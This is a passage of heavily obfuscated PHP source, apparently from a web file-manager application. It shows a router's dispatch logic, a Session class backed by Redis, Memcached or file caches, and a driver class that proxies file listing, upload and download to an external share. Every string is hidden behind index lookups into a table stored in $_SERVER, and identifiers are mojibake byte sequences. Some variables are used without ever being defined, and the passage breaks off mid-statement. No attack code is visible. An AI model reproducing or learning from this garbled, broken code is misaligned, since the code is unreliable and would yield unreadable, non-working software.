$_SERVER[$ßı›Â•÷[161]]; $øØÛË« = array_keys(static::$patterns); $§¾œë¸ = array_values(static::$patterns); $·«‰É¿û = !1; self::$routes = preg_replace($ßı›Â•÷[1455], $ßı›Â•÷[8], self::$routes); if (in_array($©ığßìô, self::$routes)) { $¾®Å’¦§ = array_keys(self::$routes, $©ığßìô); foreach ($¾®Å’¦§ as $İ¿õ’”¡) { if (self::$methods[$İ¿õ’”¡] == $± –Ä¹é || self::$methods[$İ¿õ’”¡] == $ßı›Â•÷[1905] || in_array($± –Ä¹é, self::$maps[$İ¿õ’”¡])) { $·«‰É¿û = !0; if (!is_object(self::$callbacks[$İ¿õ’”¡])) { $ƒ¡“áâˆ = explode($ßı›Â•÷[8], self::$callbacks[$İ¿õ’”¡]); $ô¥©ì× = end($ƒ¡“áâˆ); $àõò²´ = explode($ßı›Â•÷[1387], $ô¥©ì×); $¯ÇÛ’à = new $àõò²´[0](); $¯ÇÛ’à->{$àõò²´[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$İ¿õ’”¡]); if (self::$halts) { return; } } } } } else { $²Œ¡ÏÖ× = 0; foreach (self::$routes as $İ¿õ’”¡) { if (strpos($İ¿õ’”¡, $ßı›Â•÷[4]) !== !1) { $İ¿õ’”¡ = str_replace($øØÛË«, $§¾œë¸, $İ¿õ’”¡); } if (preg_match($ßı›Â•÷[1906] . $İ¿õ’”¡ . $ßı›Â•÷[1907], $©ığßìô, $¹Ü¯°ª)) { if (self::$methods[$²Œ¡ÏÖ×] == $± –Ä¹é || self::$methods[$²Œ¡ÏÖ×] == $ßı›Â•÷[1905] || !empty(self::$maps[$²Œ¡ÏÖ×]) && in_array($± –Ä¹é, self::$maps[$²Œ¡ÏÖ×])) { $·«‰É¿û = !0; array_shift($¹Ü¯°ª); if (!is_object(self::$callbacks[$²Œ¡ÏÖ×])) { $ƒ¡“áâˆ = explode($ßı›Â•÷[8], self::$callbacks[$²Œ¡ÏÖ×]); $ô¥©ì× = end($ƒ¡“áâˆ); $àõò²´ = explode($ßı›Â•÷[1387], $ô¥©ì×); $¯ÇÛ’à = new $àõò²´[0](); if (!method_exists($¯ÇÛ’à, $àõò²´[1])) { echo $ßı›Â•÷[1908]; } else { call_user_func_array(array($¯ÇÛ’à, $àõò²´[1]), $¹Ü¯°ª); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$²Œ¡ÏÖ×], $¹Ü¯°ª); if (self::$halts) { return; } } } } $²Œ¡ÏÖ×++; } } if ($·«‰É¿û == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $éè‰ØĞ =& $_SERVER[¹Éµ„ºå]; header($_SERVER[$éè‰ØĞ[1909]] . $éè‰ØĞ[1910]); echo $éè‰ØĞ[1911]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ßı›Â•÷[1904]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $¨Ü·‚ÛÌ =& $_SERVER[¹Éµ„ºå]; static $“µŒ×Ç“ = false; if ($“µŒ×Ç“) { return $“µŒ×Ç“; } $¦Ë€üéŠ = $GLOBALS[$¨Ü·‚ÛÌ[6]][$¨Ü·‚ÛÌ[424]]; self::$sessionTime = $¦Ë€üéŠ[$¨Ü·‚ÛÌ[1912]]; $æòÁ¼Ü¬ = isset($GLOBALS[$¨Ü·‚ÛÌ[1913]]) ? $GLOBALS[$¨Ü·‚ÛÌ[1913]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($æòÁ¼Ü¬)) { self::$sessionSign = Cookie::get($æòÁ¼Ü¬); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($æòÁ¼Ü¬, self::$sessionSign, self::$sessionTime); $±ã€êçÜ = $¦Ë€üéŠ[$¨Ü·‚ÛÌ[1914]]; $àú†Üş­ = $¦Ë€üéŠ[$±ã€êçÜ]; $®ªİ„Óò = $¦Ë€üéŠ[$¨Ü·‚ÛÌ[972]]; switch ($±ã€êçÜ) { case $¨Ü·‚ÛÌ[21]: self::$handle = Model($¨Ü·‚ÛÌ[973]); break; case $¨Ü·‚ÛÌ[974]: self::$handle = new CacheRedis($àú†Üş­, $®ªİ„Óò); break; case $¨Ü·‚ÛÌ[975]: self::$handle = new CacheMemcached($àú†Üş­, $®ªİ„Óò); break; case $¨Ü·‚ÛÌ[230]: $àú†Üş­[$¨Ü·‚ÛÌ[87]] = $àú†Üş­[$¨Ü·‚ÛÌ[87]] . $¨Ü·‚ÛÌ[1915]; self::$handle = new CacheFile($àú†Üş­, $®ªİ„Óò); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); if (!self::$data || !isset(self::$data[$¨Ü·‚ÛÌ[1652]]) || time() - self::$data[$¨Ü·‚ÛÌ[1652]] >= 5) { self::dataSave(); } } $“µŒ×Ç“ = new self(); return $“µŒ×Ç“; } public static function getBySign($Ûƒ‘’ë¹) { $ğÅĞ× = self::$handle->get($Ûƒ‘’ë¹); $ğÅĞ× = unserialize($ğÅĞ×); return is_array($ğÅĞ×) ? $ğÅĞ× : array(); } public static function setBySign($¼å§•, $¼´Ÿ™Ç) { self::$sessionSign = $¼å§•; self::$data = $¼´Ÿ™Ç; self::dataSave(); } private static function dataSave() { CacheLock::lock(self::$sessionSign); if (!self::$data || !is_array(self::$data)) { self::$data = array(); } self::$data[$_SERVER[¹Éµ„ºå][1652]] = time(); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function sign($õàÙ²ÎŒ = false) { if ($õàÙ²ÎŒ) { self::$sessionSign = $õàÙ²ÎŒ; } self::init(); return self::$sessionSign; } public static function set($ŠÕİ–‚ƒ, $×¡Ù‹€¡ = false) { self::init(); if (is_array($ŠÕİ–‚ƒ)) { foreach ($ŠÕİ–‚ƒ as $¬¯Şëœ– => $âÜ¼Ê™) { array_set_value(self::$data, $¬¯Şëœ–, $âÜ¼Ê™); } } else { array_set_value(self::$data, $ŠÕİ–‚ƒ, $×¡Ù‹€¡); } self::dataSave(); } public static function get($Æ˜ıÎ = false) { self::init(); if (!$Æ˜ıÎ) { return self::$data; } return array_get_value(self::$data, $Æ˜ıÎ); } public static function remove($ùƒ×œ‡¿) { self::init(); unset(self::$data[$ùƒ×œ‡¿]); self::dataSave(); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¹Éµ„ºå][981])) { self::$handle->clearTimeout(); } } } goto BìğŠŠèéÃ; dò°œäÂ: class PathDriverDriverShareOuter extends PathDriverBase { public function __construct($‚Ş¢Ì) { $ÇäşğŠ¯ =& $_SERVER[¹Éµ„ºå]; parent::__construct(); $this->uploadChunkSize = 1024 * 1024 * 2; $this->pathParse = $‚Ş¢Ì; $æöÜ¥Ÿ« = Model($ÇäşğŠ¯[686])->getInfo($‚Ş¢Ì[$ÇäşğŠ¯[487]]); $ñ»¥İß¾ = _get($æöÜ¥Ÿ«, $ÇäşğŠ¯[580]); $—ë™½© = Model($ÇäşğŠ¯[587])->authMake(_get($æöÜ¥Ÿ«, $ÇäşğŠ¯[1540])); if (!$æöÜ¥Ÿ«) { IO::errorTips(LNG($ÇäşğŠ¯[1541]), !1); } if (!$—ë™½©) { IO::errorTips(LNG($ÇäşğŠ¯[1542]), !1); } if ($ñ»¥İß¾ && is_string($ñ»¥İß¾)) { $ñ»¥İß¾ = json_decode($ñ»¥İß¾, !0); } if (!$ñ»¥İß¾ || !$—ë™½©) { return; } $this->_config = array($ÇäşğŠ¯[1346] => rtrim($‚Ş¢Ì[$ÇäşğŠ¯[1346]], $ÇäşğŠ¯[8]) . $ÇäşğŠ¯[8], $ÇäşğŠ¯[1543] => $ÇäşğŠ¯[1450] . $ñ»¥İß¾[$ÇäşğŠ¯[1544]] . $ÇäşğŠ¯[499], $ÇäşğŠ¯[576] => $æöÜ¥Ÿ«, $ÇäşğŠ¯[580] => $ñ»¥İß¾, $ÇäşğŠ¯[1545] => $—ë™½©, $ÇäşğŠ¯[1546] => substr(APP_HOST, 0, 8) == $ÇäşğŠ¯[217], $ÇäşğŠ¯[1547] => Model($ÇäşğŠ¯[591])->authCheck($—ë™½©[$ÇäşğŠ¯[503]], AuthModel::AUTH_VIEW, !1), $ÇäşğŠ¯[1548] => Model($ÇäşğŠ¯[591])->authCheck($—ë™½©[$ÇäşğŠ¯[503]], AuthModel::AUTH_EDIT, !1)); $this->authToken = $this->requestAuthToken(); } public function allowAction($«™áÍµ¢) { $öõÁÑ‘ =& $_SERVER[¹Éµ„ºå]; $ï–¦ğÈ› = $this->_config; if (!$ï–¦ğÈ›) { return !1; } $şÅäãù¡ = array($öõÁÑ‘[1549] => $ï–¦ğÈ›[$öõÁÑ‘[1547]], $öõÁÑ‘[1550] => $ï–¦ğÈ›[$öõÁÑ‘[1547]], $öõÁÑ‘[1374] => $ï–¦ğÈ›[$öõÁÑ‘[1547]], $öõÁÑ‘[107] => $ï–¦ğÈ›[$öõÁÑ‘[1548]], $öõÁÑ‘[1551] => $ï–¦ğÈ›[$öõÁÑ‘[1548]], $öõÁÑ‘[1323] => $ï–¦ğÈ›[$öõÁÑ‘[1548]], $öõÁÑ‘[1552] => !1, $öõÁÑ‘[429] => !1, $öõÁÑ‘[1553] => !1, $öõÁÑ‘[1554] => !1); return $şÅäãù¡[$«™áÍµ¢]; } public function listPath($ßŒˆÌˆ±, $®áöºı = false) { return $this->request($_SERVER[¹Éµ„ºå][1555], array($ßŒˆÌˆ±)); } public function setContent($½İ·÷¸“, $Ğ“´”Œæ = '') { return $this->request($_SERVER[¹Éµ„ºå][1556], array($½İ·÷¸“, $Ğ“´”Œæ)); } public function getContent($¼›²±Ø¬) { return $this->_fileSubstr($¼›²±Ø¬); } public function fileSubstr($Œ¯‰¥–‰, $‚¡øŠïÖ, $­±‰›«) { return $this->_fileSubstr($Œ¯‰¥–‰, $‚¡øŠïÖ, $­±‰›«); } public function download($¡­õ†î£, $¯¢¥Î­ª) { return $this->_download($¡­õ†î£, $¯¢¥Î­ª); } public function isFileOutServer() { return !1; } public function fileOut($“üÑŠõÆ, $ÊÉšáê = false, $ú£ş¤â¾ = false, $ë£÷ÄşŒ = '') { $¯èâ¯Çê =& $_SERVER[¹Éµ„ºå]; $this->fileOutLink($this->_fileLink($“üÑŠõÆ, ($ë£÷ÄşŒ ? $¯èâ¯Çê[1557] . $ë£÷ÄşŒ : $¯èâ¯Çê[12]) . ($ÊÉšáê ? $¯èâ¯Çê[1558] : $¯èâ¯Çê[12]))); } public function fileOutImage($”£Ë¯§…, $·Ï·³êÊ = 250) { $this->fileOutLink($this->_fileLink($”£Ë¯§…, $_SERVER[¹Éµ„ºå][1559] . $·Ï·³êÊ)); } public function fileOutLink($ÚÚ»Í—ş) { header($_SERVER[¹Éµ„ºå][172] . $this->urlAuto($ÚÚ»Í—ş)); die; } public function exist($ø—¸º) { $›®ûÌÛ¨ = $this->_info($ø—¸º); return $›®ûÌÛ¨ ? !0 : !1; } public function isFile($–±»í‘˜) { $¸„ó‚§§ =& $_SERVER[¹Éµ„ºå]; $ÑÊ¯å‡ = $this->_info($–±»í‘˜); return _get($ÑÊ¯å‡, $¸„ó‚§§[33], $¸„ó‚§§[12]) == $¸„ó‚§§[230]; } public function isFolder($òü¼âõ£) { $ÌµÌ¸¢ =& $_SERVER[¹Éµ„ºå]; $ÉİªÚºË = $this->_info($òü¼âõ£); return _get($ÉİªÚºË, $ÌµÌ¸¢[33], $ÌµÌ¸¢[12]) == $ÌµÌ¸¢[78]; } public function size($†À™ğ†É) { $†øÉ¶¼¼ = $this->_info($†À™ğ†É); return _get($†øÉ¶¼¼, $_SERVER[¹Éµ„ºå][79], 0); } public function info($·ÓÕåĞÔ) { return $this->_info($·ÓÕåĞÔ); } public function infoAuth($•ç’¦®¬) { return $this->_info($•ç’¦®¬); } public function infoFull($ãà¶Šèì) { return $this->_info($ãà¶Šèì); } public function infoFullSimple($Çûíç¼¦) { return $this->_info($Çûíç¼¦); } public function infoWithChildren($îËš‘¸ı) { return $this->_info($îËš‘¸ı, !0); } public function has($…Ë†Ç¼é, $·¢Š£§ê = false, $Ö «ê›× = false) { $˜”àÀ’ =& $_SERVER[¹Éµ„ºå]; $¹‰¥·»Ì = $this->_info($…Ë†Ç¼é); if (!$¹‰¥·»Ì) { return !1; } if ($·¢Š£§ê) { return array($˜”àÀ’[239] => $¹‰¥·»Ì[$˜”àÀ’[239]], $˜”àÀ’[240] => $¹‰¥·»Ì[$˜”àÀ’[240]]); } return $¿íŒñŸŠ ? $¹‰¥·»Ì[$˜”àÀ’[239]] > 0 : $¹‰¥·»Ì[$˜”àÀ’[240]] > 0; } public function mkfile($…ƒßî, $Øá£Ô¥ö = '', $í‡Ø¾¦ä = REPEAT_RENAME) { return $this->request($_SERVER[¹Éµ„ºå][1532], array($…ƒßî, $Øá£Ô¥ö, $í‡Ø¾¦ä)); } public function mkdir($ÆÇÂ€ëå, $ùŒáò‘á = REPEAT_SKIP) { return $this->request($_SERVER[¹Éµ„ºå][1533], array($ÆÇÂ€ëå, $ùŒáò‘á)); } public function remove($¯ÓêÏÂÌ) { return $this->request($_SERVER[¹Éµ„ºå][1323], array($¯ÓêÏÂÌ)); } public function rename($ø§ã¯Õ, $ŠèÚŞ”) { return $this->request($_SERVER[¹Éµ„ºå][1536], array($ø§ã¯Õ, $ŠèÚŞ”)); } public function moveSameAllow() { } public function copy($ö•Äú¬, $µÔßã¡Õ, $Ø—Ä”û§ = REPEAT_REPLACE, $ÊåøäÆŸ = false) { return $this->request($_SERVER[¹Éµ„ºå][641], array($ö•Äú¬, $µÔßã¡Õ, $Ø—Ä”û§)); } public function move($£ª²şª, $ã­™ÀëŒ, $Ô‹“Û¦ = REPEAT_REPLACE, $ÍôĞØñÆ = false) { return $this->request($_SERVER[¹Éµ„ºå][643], array($£ª²şª, $ã­™ÀëŒ, $Ô‹“Û¦)); } public function uploadLink($ƒÔ×‚Œ, $Àõ¿ÙÉŸ = 0) { $©¸üöñ£ =& $_SERVER[¹Éµ„ºå]; $ËµŸ‚˜à = IO::init($GLOBALS[$©¸üöñ£[7]][$©¸üöñ£[87]]); $•Ëä¡—Ÿ = $this->pathApiEncode($ËµŸ‚˜à->path); $Â”ÑıÍØ = $this->requestMakeUrl($©¸üöñ£[1560], array($©¸üöñ£[87] => $•Ëä¡—Ÿ)); return array($©¸üöñ£[1561] => $Â”ÑıÍØ); } public function upload($™³óÄÒË, $ñŞÁ…şØ, $‹ÀÚ±Î = false, $à¡ãÉË = REPEAT_REPLACE) { $‰––¬ÂŞ =& $_SERVER[¹Éµ„ºå]; if (filesize($ñŞÁ…şØ) < $this->uploadChunkSize) { return $this->request($‰––¬ÂŞ[107], array($™³óÄÒË, $ñŞÁ…şØ, $à¡ãÉË)); } $áßŠ¢üƒ = $this->uploadHashCheck($™³óÄÒË, $ñŞÁ…şØ, $à¡ãÉË); if ($áßŠ¢üƒ) { return $áßŠ¢üƒ; } $ÂŞùß—¦ = @filesize($ñŞÁ…şØ); $‚ÎÌ¹ø = $this->uploadChunkSize; $˜Ø¿ıØö = ceil($ÂŞùß—¦ / $‚ÎÌ¹ø); $ê³÷ƒ‚í = 0; while ($ê³÷ƒ‚í < $˜Ø¿ıØö) { $ÃØÉçÔà = IO::fileSubstr($ñŞÁ…şØ, $ê³÷ƒ‚í * $‚ÎÌ¹ø, $‚ÎÌ¹ø); $Ü¼è¿òÑ = $this->tempFile($‰––¬ÂŞ[12], $ÃØÉçÔà); $£ˆ‘û¾ = array($‰––¬ÂŞ[79] => $ÂŞùß—¦, $‰––¬ÂŞ[1562] => $‚ÎÌ¹ø, $‰––¬ÂŞ[1563] => $˜Ø¿ıØö, $‰––¬ÂŞ[1564] => $ê³÷ƒ‚í); $¸¬ĞêÑ = $this->uploadSend($™³óÄÒË, $Ü¼è¿òÑ, $£ˆ‘û¾, $à¡ãÉË); $ê³÷ƒ‚í++; if (!$¸¬ĞêÑ) { return !1; } } if (!is_array($¸¬ĞêÑ) || empty($¸¬ĞêÑ[$‰––¬ÂŞ[595]])) { return !1; } return $this->pathApiDecode($¸¬ĞêÑ[$‰––¬ÂŞ[595]]); } private function uploadHashCheck($¦íÈÈºó, $äÕåË—, $ø÷½Ğû ) { $‡ˆä¾Œ =& $_SERVER[¹Éµ„ºå]; $äß©èø = IO::hashSimple($äÕåË—); $Êà©„‰ = array($‡ˆä¾Œ[1565] => $‡ˆä¾Œ[1566], $‡ˆä¾Œ[1525] => $äß©èø); $Ü»Œ•Ì½ = $this->uploadSend($¦íÈÈºó, $‡ˆä¾Œ[12], $Êà©„‰, $ø÷½Ğû ); $—£²Öøæ = _get($Ü»Œ•Ì½, $‡ˆä¾Œ[595], array()); $ÎêÊúÁ¬ = _get($—£²Öøæ, $‡ˆä¾Œ[1567]); if (!is_array($ÎêÊúÁ¬) || !$ÎêÊúÁ¬[$‡ˆä¾Œ[563]]) { return !1; } $‰¹íèÊ = IO::hashMd5($äÕåË—); if ($ÎêÊúÁ¬[$‡ˆä¾Œ[563]] != $‰¹íèÊ) { return !1; } if ($Ü»Œ•Ì½[$‡ˆä¾Œ[595]][$‡ˆä¾Œ[1568]]) { $this->uploadChunkSize = $Ü»Œ•Ì½[$‡ˆä¾Œ[595]][$‡ˆä¾Œ[1568]]; } $Êà©„‰ = array($‡ˆä¾Œ[1565] => $‡ˆä¾Œ[1569], $‡ˆä¾Œ[1526] => $‰¹íèÊ, $‡ˆä¾Œ[1525] => $äß©èø); $Ü»Œ•Ì½ = $this->uploadSend($¦íÈÈºó, $‡ˆä¾Œ[12], $Êà©„‰, $ø÷½Ğû ); if (!is_array($Ü»Œ•Ì½) || empty($Ü»Œ•Ì½[$‡ˆä¾Œ[595]])) { return !1; } return $this->pathApiDecode($Ü»Œ•Ì½[$‡ˆä¾Œ[595]]); } private function uploadSend($éÌÓÌƒ•, $ÜçÅ¥±İ, $“şªôŠ”, $¾Í÷ñ½• = '') { $ÆŒ´ØÙ¹ =& $_SERVER[¹Éµ„ºå]; $“şªôŠ”[$ÆŒ´ØÙ¹[32]] = get_path_this($éÌÓÌƒ•); $“şªôŠ”[$ÆŒ´ØÙ¹[87]] = $this->pathApiEncode(get_path_father($éÌÓÌƒ•)); if ($¾Í÷ñ½•) { $“şªôŠ”[$ÆŒ´ØÙ¹[1570]] = $¾Í÷ñ½•; } if ($ÜçÅ¥±İ) { $“şªôŠ”[$ÆŒ´ØÙ¹[230]] = $ÆŒ´ØÙ¹[1387] . $ÜçÅ¥±İ; } return $this->requestSend($ÆŒ´ØÙ¹[1560], $“şªôŠ”); } protected function pathApiEncode($’™³³ş×) { $…èªœ =& $_SERVER[¹Éµ„ºå]; $º×•Ü½ƒ = $this->_config[$…èªœ[1543]]; $ÒÎ¾É›’ = strlen($º×•Ü½ƒ); if (substr($’™³³ş×, 0, $ÒÎ¾É›’) == $º×•Ü½ƒ) { return $’™³³ş×; } return $º×•Ü½ƒ . ltrim($’™³³ş×, $…èªœ[8]); } protected function pathApiDecode($Ö¢ç…Ã) { $«ø¼ßÍ„ =& $_SERVER[¹Éµ„ºå]; $»šÕêŞ = $this->_config[$«ø¼ßÍ„[1543]]; $ûÁäªôÆ = strlen($»šÕêŞ); if (substr($Ö¢ç…Ã, 0, $ûÁäªôÆ) !== $»šÕêŞ) { return $Ö¢ç…Ã; } return $this->_config[$«ø¼ßÍ„[1346]] . ltrim(substr($Ö¢ç…Ã, $ûÁäªôÆ), $«ø¼ßÍ„[8]); } private function pathInfoParse(&$šß¤çõ) { $ô÷•Ÿƒ =& $_SERVER[¹Éµ„ºå]; $ùæ³ı´ó = $this->_config; $‰¨ö””É = $ùæ³ı´ó[$ô÷•Ÿƒ[576]]; if (!$šß¤çõ || !is_array($šß¤çõ)) { return $šß¤çõ; } static $şíˆİ™ö = array(); $ÕÑ¥ËÏÇ = $şíˆİ™ö[$‰¨ö””É[$ô÷•Ÿƒ[687]]]; if (!is_array($ÕÑ¥ËÏÇ)) { $¤­²Ì = LNG($ô÷•Ÿƒ[1571]); $æ¬ÆÃˆ“ = $ùæ³ı´ó[$ô÷•Ÿƒ[580]][$ô÷•Ÿƒ[90]]; $ú¯µÕ„ = parse_url($ùæ³ı´ó[$ô÷•Ÿƒ[580]][$ô÷•Ÿƒ[1572]]); $ˆë”·º = $ùæ³ı´ó[$ô÷•Ÿƒ[580]][$ô÷•Ÿƒ[1573]]; $ÕÑ¥ËÏÇ = array($ô÷•Ÿƒ[1574] => $æ¬ÆÃˆ“[$ô÷•Ÿƒ[32]] . $ô÷•Ÿƒ[1057] . $ˆë”·º . $ô÷•Ÿƒ[1387] . $ú¯µÕ„[$ô÷•Ÿƒ[206]] . $ô÷•Ÿƒ[1059], $ô÷•Ÿƒ[1575] => $¤­²Ì . $ô÷•Ÿƒ[1123] . $ùæ³ı´ó[$ô÷•Ÿƒ[580]][$ô÷•Ÿƒ[1572]] . $ô÷•Ÿƒ[1576] . LNG($ô÷•Ÿƒ[1577]) . $ô÷•Ÿƒ[1123] . $ˆë”·º, $ô÷•Ÿƒ[1578] => LNG($ô÷•Ÿƒ[1579]) . $ô÷•Ÿƒ[1580] . $ùæ³ı´ó[$ô÷•Ÿƒ[580]][$ô÷•Ÿƒ[1572]] . $ô÷•Ÿƒ[285] . LNG($ô÷•Ÿƒ[1581]) . $ô÷•Ÿƒ[1580] . $æ¬ÆÃˆ“[$ô÷•Ÿƒ[602]], $ô÷•Ÿƒ[1573] => array($ô÷•Ÿƒ[32] => $ˆë”·º, $ô÷•Ÿƒ[1582] => $ô÷•Ÿƒ[1583]), $ô÷•Ÿƒ[1584] => Action($ô÷•Ÿƒ[1530])->shareTargetMake($‰¨ö””É[$ô÷•Ÿƒ[1540]])); $şíˆİ™ö[$‰¨ö””É[$ô÷•Ÿƒ[687]]] = $ÕÑ¥ËÏÇ; } unset($šß¤çõ[$ô÷•Ÿƒ[191]]); unset($šß¤çõ[$ô÷•Ÿƒ[604]]); unset($šß¤çõ[$ô÷•Ÿƒ[188]]); unset($šß¤çõ[$ô÷•Ÿƒ[589]]); $šß¤çõ[$ô÷•Ÿƒ[1585]] = !0; $šß¤çõ[$ô÷•Ÿƒ[232]] = $ùæ³ı´ó[$ô÷•Ÿƒ[1547]]; $šß¤çõ[$ô÷•Ÿƒ[233]] = $ùæ³ı´ó[$ô÷•Ÿƒ[1548]]; $šß¤çõ[$ô÷•Ÿƒ[502]] = $ùæ³ı´ó[$ô÷•Ÿƒ[1545]]; $šß¤çõ[$ô÷•Ÿƒ[1573]] = $ÕÑ¥ËÏÇ[$ô÷•Ÿƒ[1573]]; $šß¤çõ[$ô÷•Ÿƒ[1586]] = $‰¨ö””É[$ô÷•Ÿƒ[231]]; $šß¤çõ[$ô÷•Ÿƒ[1587]] = $‰¨ö””É[$ô÷•Ÿƒ[88]]; $šß¤çõ[$ô÷•Ÿƒ[1588]] = $ÕÑ¥ËÏÇ[$ô÷•Ÿƒ[1578]]; $šß¤çõ[$ô÷•Ÿƒ[1584]] = $ÕÑ¥ËÏÇ[$ô÷•Ÿƒ[1584]]; $šß¤çõ[$ô÷•Ÿƒ[687]] = $‰¨ö””É[$ô÷•Ÿƒ[687]]; $ºòñ¼¹î = explode($ô÷•Ÿƒ[8], trim($šß¤çõ[$ô÷•Ÿƒ[602]], $ô÷•Ÿƒ[8])); $ºòñ¼¹î[0] = $ÕÑ¥ËÏÇ[$ô÷•Ÿƒ[1574]]; $šß¤çõ[$ô÷•Ÿƒ[602]] = implode($ô÷•Ÿƒ[8], $ºòñ¼¹î); if (count($ºòñ¼¹î) > 1) { unset($šß¤çõ[$ô÷•Ÿƒ[1584]]); } if (count($ºòñ¼¹î) == 1) { if ($šß¤çõ[$ô÷•Ÿƒ[33]] == $ô÷•Ÿƒ[78]) { $šß¤çõ[$ô÷•Ÿƒ[32]] = $ÕÑ¥ËÏÇ[$ô÷•Ÿƒ[1574]]; } array_set_value($šß¤çõ, $ô÷•Ÿƒ[1589], $ÕÑ¥ËÏÇ[$ô÷•Ÿƒ[1575]]); } $§Ù‚ò¼à = array($ô÷•Ÿƒ[1590], $ô÷•Ÿƒ[1509], $ô÷•Ÿƒ[1591], $ô÷•Ÿƒ[1592]); foreach ($§Ù‚ò¼à as $… Ìû¨) { $øñŒØõ = $this->urlAuto(_get($šß¤çõ, $… Ìû¨, $ô÷•Ÿƒ[12])); if ($øñŒØõ) { array_set_value($šß¤çõ, $… Ìû¨, $øñŒØõ); } } } private function _info($×‚ªÙ¡, $ÎÛ¬Ü€² = false) { $«µü•‚¼ =& $_SERVER[¹Éµ„ºå]; $ÜöÉè¿ = $this->_config; if (!$ÜöÉè¿) { return !1; } static $˜øÓ¯Æ¥ = array(); if (isset($˜øÓ¯Æ¥[$×‚ªÙ¡]) && is_array($˜øÓ¯Æ¥[$×‚ªÙ¡])) { return $˜øÓ¯Æ¥[$×‚ªÙ¡]; } if ((!$×‚ªÙ¡ || !trim($×‚ªÙ¡, $«µü•‚¼[8])) && !$ÎÛ¬Ü€²) { $øœ¿¾¡¦ = $ÜöÉè¿[$«µü•‚¼[580]][$«µü•‚¼[90]]; if (!$øœ¿¾¡¦) { return !1; } $øœ¿¾¡¦[$«µü•‚¼[602]] = $«µü•‚¼[12]; $øœ¿¾¡¦[$«µü•‚¼[87]] = $ÜöÉè¿[$«µü•‚¼[1346]]; $this->pathInfoParse($øœ¿¾¡¦); return $øœ¿¾¡¦; } $éÌ’äŞ× = $this->request($«µü•‚¼[1593], array($×‚ªÙ¡, $ÎÛ¬Ü€²)); $˜øÓ¯Æ¥[$×‚ªÙ¡] = $éÌ’äŞ×; return $éÌ’äŞ×; } private function _fileSubstr($äâ—ÚË, $£ºÖøù– = 0, $§±Â¢Æ = -1) { $ñ±Ó™¥Ç =& $_SERVER[¹Éµ„ºå]; $ÚÕÓ™Å¿ = $this->_fileLink($äâ—ÚË); if (!$ÚÕÓ™Å¿) { return !1; } $³Â¡æá° = !1; if ($§±Â¢Æ > 0) { $Ï…Î‰¹› = $ò‰ûİÛô + $§±Â¢Æ - 1; $³Â¡æá° = array($ñ±Ó™¥Ç[1594] . $ò‰ûİÛô . $ñ±Ó™¥Ç[476] . $Ï…Î‰¹›); } $øÏ˜•Á´ = url_request($ÚÕÓ™Å¿, $ñ±Ó™¥Ç[1595], !1, $³Â¡æá°); return $øÏ˜•Á´[$ñ±Ó™¥Ç[841]] ? $øÏ˜•Á´[$ñ±Ó™¥Ç[1381]] : !1; } private function _download($ú»Ôú«, $Öíîà†·) { $ˆµ­‰¼ = $this->_fileLink($ú»Ôú«); if (!$ˆµ­‰¼) { return !1; } Downloader::start($ˆµ­‰¼, $Öíîà†·); return $Öíîà†·; } private function _fileLink($ŠßÖ¤„Ë, $ï¸”ışÎ = '') { $±¡ÄÇ¨ =& $_SERVER[¹Éµ„ºå]; $ÔÔğ„Ğ = $this->pathApiEncode($ŠßÖ¤„Ë); return $this->requestMakeUrl($±¡ÄÇ¨[1596], array($±¡ÄÇ¨[87] => $ÔÔğ„Ğ)) . $ï¸”ışÎ; } private function urlAuto($’Ãîåé¥) { $Í ÙÉÉ =& $_SERVER[¹Éµ„ºå]; if (!$’Ãîåé¥) { return $’Ãîåé¥; } $ù¹ôÂ¶÷ = parse_url($’Ãîåé¥); $€ùàÚÖ± = $’Ãîåé¥; if ($this->_config[$Í ÙÉÉ[1546]] && $ù¹ôÂ¶÷[$Í ÙÉÉ[205]] == $Í ÙÉÉ[149] && Input::check($ù¹ôÂ¶÷[$Í ÙÉÉ[1597]], $Í ÙÉÉ[1598])) { $’Ãîåé¥ = $Í ÙÉÉ[217] . substr($’Ãîåé¥, 7); } $™ñçĞŸ’ = $Í ÙÉÉ[1599] . rawurlencode(rtrim($this->config[$Í ÙÉÉ[1543]], $Í ÙÉÉ[8])); if (strstr($’Ãîåé¥, $™ñçĞŸ’)) { $È™ˆ™ÚÅ = strstr($’Ãîåé¥, $Í ÙÉÉ[76]) ? $Í ÙÉÉ[284] : $Í ÙÉÉ[76]; $’Ãîåé¥ = $’Ãîåé¥ . $È™ˆ™ÚÅ . $Í ÙÉÉ[1600] . $this->authToken; } return $’Ãîåé¥; } private function request($œá© ğÆ, $ëÀè†ˆ) { $ôˆÛâ³ =& $_SERVER[¹Éµ„ºå]; if (!is_array($ëÀè†ˆ)) { $ëÀè†ˆ = array(); } for ($İÍêşƒ¡ = 0; $İÍêşƒ¡ < 4; $İÍêşƒ¡++) { if (!isset($ëÀè†ˆ[$İÍêşƒ¡])) { $ëÀè†ˆ[$İÍêşƒ¡] = $ôˆÛâ³[12]; } } $°Í—îïû = array($ôˆÛâ³[1593] => array($ôˆÛâ³[1601] => $ôˆÛâ³[1593], $ôˆÛâ³[1602] => $ôˆÛâ³[1603], $ôˆÛâ³[1604] => $ôˆÛâ³[87], $ôˆÛâ³[1345] => array($ôˆÛâ³[1605] => array(array($ôˆÛâ³[87] => $ëÀè†ˆ[0])), $ôˆÛâ³[1606] => $ëÀè†ˆ[1] ? $ôˆÛâ³[91] : $ôˆÛâ³[12])), $ôˆÛâ³[1555] => array($ôˆÛâ³[1601] => $ôˆÛâ³[1607], $ôˆÛâ³[1602] => $ôˆÛâ³[87], $ôˆÛâ³[1604] => $ôˆÛâ³[1608], $ôˆÛâ³[1345] => array($ôˆÛâ³[87] => $ëÀè†ˆ[0], $ôˆÛâ³[428] => _get($GLOBALS[$ôˆÛâ³[7]], 